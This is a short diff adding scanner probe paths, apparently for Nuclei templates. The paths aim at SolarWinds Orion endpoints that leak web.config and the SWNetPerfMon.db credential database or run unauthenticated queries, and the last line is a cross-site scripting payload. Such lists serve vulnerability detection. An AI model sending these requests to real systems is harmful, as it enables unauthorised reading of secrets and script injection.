@@ -1,0 +1,8 @@
+/web.config.i18n.ashx?l={{string}}&v={{string}}
+/SWNetPerfMon.db.i18n.ashx?l={{string}}&v={{string}}
+/web.config.i18n.ashx?l=nuclei&v=nuclei
+/SWNetPerfMon.db.i18n.ashx?l=nuclei&v=nuclei
+/SolarWinds/InformationService/v3/Json/Query?query=SELECT+Uri+FROM+Orion.Pollers+ORDER+BY+PollerID+WITH+ROWS+1+TO+3+WITH+TOTALROWS
+/InformationService/v3/Json/Query?query=SELECT+Uri+FROM+Orion.Pollers+ORDER+BY+PollerID+WITH+ROWS+1+TO+3+WITH+TOTALROWS
+/Orion/Login.aspx
+/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f
